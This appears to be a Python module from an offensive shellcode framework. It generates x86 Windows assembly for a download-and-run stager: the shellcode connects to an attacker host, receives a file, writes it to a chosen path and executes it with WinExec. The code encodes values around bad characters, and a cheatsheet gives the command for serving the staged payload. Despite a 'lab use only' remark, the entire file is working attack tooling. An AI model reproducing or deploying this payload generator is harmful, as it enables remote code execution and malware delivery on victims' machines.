"""TCP download-and-run payload template.

Protocol (attacker server speaks first):
  [4 bytes LE] file_size
  [file_size bytes] raw file data

Framing mode: minimal. The four-byte size header is requested with one recv()
call to reduce emitted size. TCP may return a short header, so this template is
intended only for controlled lab links and is not a reliable transfer mode.

Template sequence:
  WSAStartup -> WSASocketA -> connect -> recv(4) -> VirtualAlloc ->
  recv loop -> closesocket -> CreateFileA -> WriteFile -> CloseHandle ->
  WinExec(dst_path)

Required functions: LoadLibraryA, WSAStartup, WSASocketA, connect, recv,
                    closesocket, VirtualAlloc, CreateFileA, WriteFile,
                    CloseHandle, WinExec
Required variables: socket_handle, file_handle, virt_buf,
                    bytes_total, bytes_recvd
Required strings:   dst_path
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig
from ..encode import encode_dword, encode_word, safe_push_dword, safe_push_word_as_dword


class TcpDownloadTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = (
        "LoadLibraryA",
        "WSAStartup",
        "WSASocketA",
        "connect",
        "recv",
        "closesocket",
        "VirtualAlloc",
        "CreateFileA",
        "WriteFile",
        "CloseHandle",
        "WinExec",
    )
    REQUIRED_VARIABLES = (
        "socket_handle",
        "file_handle",
        "virt_buf",
        "bytes_total",
        "bytes_recvd",
    )

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)

        wsa_start  = layout.slot("WSAStartup").ebp_ref
        wsa_sock   = layout.slot("WSASocketA").ebp_ref
        conn       = layout.slot("connect").ebp_ref
        recv_fn    = layout.slot("recv").ebp_ref
        closesk    = layout.slot("closesocket").ebp_ref
        valloc     = layout.slot("VirtualAlloc").ebp_ref
        createfile = layout.slot("CreateFileA").ebp_ref
        writefile  = layout.slot("WriteFile").ebp_ref
        closehdl   = layout.slot("CloseHandle").ebp_ref
        winexec    = layout.slot("WinExec").ebp_ref

        sock_h      = layout.slot("socket_handle").ebp_ref
        file_h      = layout.slot("file_handle").ebp_ref
        virt_buf    = layout.slot("virt_buf").ebp_ref
        bytes_total = layout.slot("bytes_total").ebp_ref
        bytes_recvd = layout.slot("bytes_recvd").ebp_ref

        wsadata  = layout.slot("WSADATA").ebp_ref
        sockaddr = layout.slot("sockaddr_in").ebp_ref

        try:
            dst = layout.slot("dst_path").ebp_ref
        except KeyError as e:
            raise ValueError(
                "TcpDownloadTemplate requires a 'dst_path' string slot. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; ── TCP Download and Run Payload ───────────────────────────────────",
            f"; Server: {config.lhost}:{config.lport}",
            f"; Writes to: {config.dst_path}",
            "; Protocol: [uint32 LE size][raw bytes]",
            "; Framing: minimal (single recv for size header; lab use only)",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            f"    lea  esi, {wsadata}",
            "    push esi",
            *safe_push_word_as_dword(0x0202, config.badchars),
            f"    call dword ptr {wsa_start}",
            "",
            "    ; WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0)",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax                    ; IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; AF_INET",
            f"    call dword ptr {wsa_sock}",
            f"    mov  {sock_h}, eax",
            "",
            "    ; sockaddr_in: sin_port and sin_addr (sin_family set by structure init)",
            f"    lea  edi, {sockaddr}",
            "    xor  eax, eax",
            *encode_word(port_be, config.badchars, "ax"),
            "    mov  word ptr [edi+0x02], ax   ; sin_port (big-endian)",
            *encode_dword(ip_le, config.badchars, "eax"),
            "    mov  dword ptr [edi+0x04], eax ; sin_addr (network order)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            f"    lea  eax, {sockaddr}",
            "    push 0x10",
            "    push eax",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {conn}",
            "",
            "    ; recv(socket, &bytes_total, 4, 0) — read 4-byte file size",
            "    xor  eax, eax",
            f"    lea  ecx, {bytes_total}",
            "    push eax                    ; flags = 0",
            "    push 4                      ; len",
            "    push ecx                    ; buf = &bytes_total",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {recv_fn}",
            "",
            "    ; VirtualAlloc(NULL, bytes_total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
            "    xor  eax, eax",
            "    push 4                      ; PAGE_READWRITE",
            "    mov  al, 0x30",
            "    shl  eax, 8                 ; MEM_COMMIT|MEM_RESERVE = 0x3000",
            f"    push eax",
            f"    push dword ptr {bytes_total}",
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            f"    call dword ptr {valloc}",
            f"    mov  {virt_buf}, eax",
            "",
            "    ; initialise bytes_recvd = 0",
            "    xor  eax, eax",
            f"    mov  {bytes_recvd}, eax",
            "",
            "tcp_recv_loop:",
            "    ; buf ptr = virt_buf + bytes_recvd",
            f"    mov  eax, {virt_buf}",
            f"    add  eax, {bytes_recvd}",
            "    ; remaining = bytes_total - bytes_recvd",
            f"    mov  ecx, {bytes_total}",
            f"    sub  ecx, {bytes_recvd}",
            "    xor  ebx, ebx",
            "    push ebx                    ; flags = 0",
            "    push ecx                    ; len = remaining",
            "    push eax                    ; buf",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {recv_fn}",
            "    test eax, eax",
            "    jle  tcp_recv_done          ; 0 = closed, negative = error",
            f"    add  {bytes_recvd}, eax",
            f"    mov  eax, {bytes_recvd}",
            f"    cmp  eax, {bytes_total}",
            "    jl   tcp_recv_loop",
            "",
            "tcp_recv_done:",
            "    ; closesocket(socket)",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {closesk}",
            "",
            "    ; CreateFileA(dst_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,",
            "    ;             FILE_ATTRIBUTE_NORMAL, NULL)",
            "    xor  ebx, ebx",
            "    push ebx                    ; hTemplateFile = NULL",
            *safe_push_dword(0x80, config.badchars),  # FILE_ATTRIBUTE_NORMAL
            "    push 2                      ; CREATE_ALWAYS",
            "    push ebx                    ; lpSecurityAttributes = NULL",
            "    push ebx                    ; dwShareMode = 0",
            "    xor  eax, eax",
            "    mov  al, 0x40",
            "    shl  eax, 24               ; GENERIC_WRITE = 0x40000000",
            "    push eax",
            f"    lea  eax, {dst}",
            "    push eax                    ; lpFileName",
            f"    call dword ptr {createfile}",
            f"    mov  {file_h}, eax",
            "",
            "    ; WriteFile(file_handle, virt_buf, bytes_total,",
            "    ;           &bytes_recvd /* scratch */, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpOverlapped = NULL",
            f"    lea  eax, {bytes_recvd}    ; scratch for lpNumberOfBytesWritten",
            "    push eax",
            f"    push dword ptr {bytes_total}",
            f"    push dword ptr {virt_buf}",
            f"    push dword ptr {file_h}",
            f"    call dword ptr {writefile}",
            "",
            "    ; CloseHandle(file_handle)",
            f"    push dword ptr {file_h}",
            f"    call dword ptr {closehdl}",
            "",
            "    ; WinExec(dst_path, SW_SHOWNORMAL)",
            f"    lea  eax, {dst}",
            "    push 1",
            "    push eax",
            f"    call dword ptr {winexec}",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Serve file for download",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} --file <FILE_TO_SERVE>"),
            ("Protocol", "[4 bytes LE size][raw file bytes]"),
            ("File written to", config.dst_path),
        ]
